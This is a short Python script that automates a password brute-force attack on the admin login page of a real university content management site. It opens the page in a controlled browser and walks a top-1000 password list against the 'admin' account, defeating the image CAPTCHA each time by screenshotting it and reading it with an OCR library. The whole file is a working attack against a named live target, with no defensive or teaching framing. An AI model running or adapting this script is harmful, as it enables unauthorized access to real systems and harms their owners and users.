import os

import ddddocr
from helium import *
import time
import requests
from selenium.webdriver.common.by import By

url ="http://www.cms.zju.edu.cn/admin.php?c=Index&a=login"
driver = helium.start_chrome(url)
file='Password-Top1000（1010）.txt'
username_css="#username"
image= '#checkcode'
# login = '登录'#or


def get_image():
    get_driver().find_element(By.CSS_SELECTOR,image).screenshot(r'./checkcode.png')

def number_verify():
    get_image()
    ocr = ddddocr.DdddOcr()
    verifycode_path = open('checkcode.png', 'rb')
    img = verifycode_path.read()
    result = ocr.classification(img)
    print(result)
    return result

if __name__=='__main__':
    with open(file) as f:
        wait_until(S(username_css).exists)
        for line in f.readlines():
            login_button = S('input[type="image"][src="http://www.cms.zju.edu.cn/skin/images/login_btn.jpg"]')
            write('admin',S(username_css))
            press(TAB)
            write(line.strip('\n'))
            press(TAB)
            write(number_verify())
            click(login_button)
            time.sleep(1)
        kill_browser()